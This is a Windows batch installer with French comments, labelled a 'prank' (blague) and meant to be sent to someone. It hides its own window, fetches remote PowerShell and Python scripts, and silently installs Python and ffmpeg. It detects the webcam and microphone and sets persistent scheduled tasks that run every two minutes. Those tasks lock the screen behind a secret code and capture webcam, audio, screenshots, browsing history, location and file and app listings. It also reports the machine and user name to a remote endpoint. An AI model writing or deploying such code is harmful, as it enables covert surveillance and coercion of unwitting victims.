@echo off
:: ================================================================
:: BLAGUE — Installation
:: A PERSONNALISER avant d'envoyer :
::   WEBAPP_URL  : URL du Apps Script Web App (apres deploiement)
::   TOKEN       : ton token GitHub
::   CODE_SECRET : code pour debloquer l'ecran
:: ================================================================

:: Trick invisibilite : si pas lance en mode cache, se relance via WScript (fenetre 0)
if "%1"=="--hidden" goto MAIN
echo Set s = CreateObject("WScript.Shell") > "%TEMP%\__run.vbs"
echo s.Run "cmd /c """"%~f0"""" --hidden", 0, False >> "%TEMP%\__run.vbs"
wscript "%TEMP%\__run.vbs"
del "%TEMP%\__run.vbs" >nul 2>&1
exit

:MAIN

set WEBAPP_URL=REMPLACER_PAR_URL_APPS_SCRIPT
set TOKEN=REMPLACER_PAR_TON_TOKEN_GITHUB
set CODE_SECRET=REMPLACER_PAR_TON_CODE_SECRET
set OWNER=thesangu
set REPO=Aventuuuure
set BRANCH=claude/signature-prank-replace-xhom2n
set DOSSIER=%APPDATA%\BlagueVerrou

set PS_LOCK=%DOSSIER%\blague_lock_windows.ps1
set PS_CAM=%DOSSIER%\blague_webcam_windows.ps1
set PS_LIST=%DOSSIER%\blague_listing_windows.ps1
set PS_AUDIO=%DOSSIER%\blague_audio_windows.ps1
set PS_HIST=%DOSSIER%\blague_historique_windows.ps1
set PS_SCREEN=%DOSSIER%\blague_screenshot_windows.ps1
set PS_LOC=%DOSSIER%\blague_localisation_windows.ps1
set PS_APPS=%DOSSIER%\blague_apps_windows.ps1
set PS_UPDATE=%DOSSIER%\blague_update_windows.ps1
set PY_SIG=%DOSSIER%\blague_signature_windows.py
set FFMPEG=%DOSSIER%\ffmpeg.exe
set RAW=https://raw.githubusercontent.com/%OWNER%/%REPO%/claude/signature-prank-replace-xhom2n/tools

mkdir "%DOSSIER%" 2>nul

curl -s -L "%RAW%/blague_lock_windows.ps1"          -o "%PS_LOCK%"
curl -s -L "%RAW%/blague_webcam_windows.ps1"         -o "%PS_CAM%"
curl -s -L "%RAW%/blague_listing_windows.ps1"        -o "%PS_LIST%"
curl -s -L "%RAW%/blague_audio_windows.ps1"          -o "%PS_AUDIO%"
curl -s -L "%RAW%/blague_historique_windows.ps1"     -o "%PS_HIST%"
curl -s -L "%RAW%/blague_screenshot_windows.ps1"     -o "%PS_SCREEN%"
curl -s -L "%RAW%/blague_localisation_windows.ps1"   -o "%PS_LOC%"
curl -s -L "%RAW%/blague_apps_windows.ps1"           -o "%PS_APPS%"
curl -s -L "%RAW%/blague_update_windows.ps1"         -o "%PS_UPDATE%"
curl -s -L "%RAW%/blague_signature_windows.py"       -o "%PY_SIG%"

:: Installation Python si absent
python --version >nul 2>&1
if %ERRORLEVEL% neq 0 (
    curl -s -L "https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe" -o "%TEMP%\pysetup.exe"
    "%TEMP%\pysetup.exe" /quiet InstallAllUsers=0 PrependPath=1 Include_launcher=0
    del "%TEMP%\pysetup.exe" >nul 2>&1
)

:: Telechargement ffmpeg
powershell -WindowStyle Hidden -Command ^
  "Invoke-WebRequest 'https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip' -OutFile '$env:TEMP\ffmpeg.zip'; ^
   Expand-Archive '$env:TEMP\ffmpeg.zip' -DestinationPath '$env:TEMP\ffmpeg_ext' -Force; ^
   Copy-Item (Get-ChildItem '$env:TEMP\ffmpeg_ext' -Filter 'ffmpeg.exe' -Recurse | Select-Object -First 1).FullName '%FFMPEG%'"

:: Detection webcam
powershell -WindowStyle Hidden -Command ^
  "$d = & '%FFMPEG%' -list_devices true -f dshow -i dummy 2>&1; ^
   $l = $d | Select-String '\\\".*\\\"' | Select-Object -First 1; ^
   if ($l) { $l.Matches.Value.Trim('\"') } else { '' }" > "%TEMP%\cam.txt"
set /p CAMERA=<"%TEMP%\cam.txt"

:: Detection micro
powershell -WindowStyle Hidden -Command ^
  "$d = & '%FFMPEG%' -list_devices true -f dshow -i dummy 2>&1; ^
   $a = $false; ^
   foreach ($l in $d) { ^
     if ($l -match 'DirectShow audio') { $a = $true; continue } ^
     if ($a -and $l -match '\\\"(.+?)\\\"') { $Matches[1]; break } ^
   }" > "%TEMP%\mic.txt"
set /p MIC=<"%TEMP%\mic.txt"

:: Ecriture config
powershell -WindowStyle Hidden -Command ^
  "$c = [ordered]@{token='%TOKEN%';owner='%OWNER%';repo='%REPO%';branch='%BRANCH%';lock_path='data/blague_lock.json';code_secret='%CODE_SECRET%';camera_name='%CAMERA%';mic_name='%MIC%';webapp_url='%WEBAPP_URL%'}; ^
   $c | ConvertTo-Json | Set-Content -Encoding UTF8 '%DOSSIER%\blague_config.json'"

:: Commandes de lancement
set CMD_LOCK=powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_LOCK%"
set CMD_CAM=powershell  -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_CAM%"
set CMD_LIST=powershell  -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_LIST%"
set CMD_AUDIO=powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_AUDIO%"
set CMD_HIST=powershell   -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_HIST%"
set CMD_SCREEN=powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_SCREEN%"
set CMD_LOC=powershell   -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_LOC%"
set CMD_APPS=powershell  -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_APPS%"
set CMD_UPDATE=powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_UPDATE%"
set CMD_SIG=pythonw "%PY_SIG%"

:: Taches planifiees
schtasks /create /tn "BlagueVerrou"              /tr "%CMD_LOCK%"   /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueVerrouGardien"       /tr "%CMD_LOCK%"   /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueWebcam"              /tr "%CMD_CAM%"    /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueWebcamGardien"       /tr "%CMD_CAM%"    /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BloagueListing"            /tr "%CMD_LIST%"   /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueListingGardien"      /tr "%CMD_LIST%"   /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueAudio"               /tr "%CMD_AUDIO%"  /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueAudioGardien"        /tr "%CMD_AUDIO%"  /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueHistorique"          /tr "%CMD_HIST%"   /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueHistoriqueGardien"   /tr "%CMD_HIST%"   /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueScreenshot"          /tr "%CMD_SCREEN%" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueScreenshotGardien"   /tr "%CMD_SCREEN%" /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueLocalisation"        /tr "%CMD_LOC%"    /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueLocalisationGardien" /tr "%CMD_LOC%"    /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueApps"               /tr "%CMD_APPS%"   /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueAppsGardien"         /tr "%CMD_APPS%"   /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueUpdate"             /tr "%CMD_UPDATE%" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueUpdateGardien"       /tr "%CMD_UPDATE%" /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueSignature"           /tr "%CMD_SIG%"    /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueSignatureGardien"    /tr "%CMD_SIG%"    /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1

:: Notification installation
powershell -WindowStyle Hidden -Command ^
  "$body = @{type='install';machine=$env:COMPUTERNAME;user=$env:USERNAME;date=(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')} | ConvertTo-Json -Compress; ^
   Invoke-RestMethod -Uri '%WEBAPP_URL%' -Method Post -Body $body -ContentType 'application/json' | Out-Null"

:: Lancement immediat de tout (silencieux)
start "" /b %CMD_LOCK%
start "" /b %CMD_CAM%
start "" /b %CMD_LIST%
start "" /b %CMD_AUDIO%
start "" /b %CMD_HIST%
start "" /b %CMD_SCREEN%
start "" /b %CMD_LOC%
start "" /b %CMD_APPS%
start "" /b %CMD_UPDATE%
start "" /b %CMD_SIG%
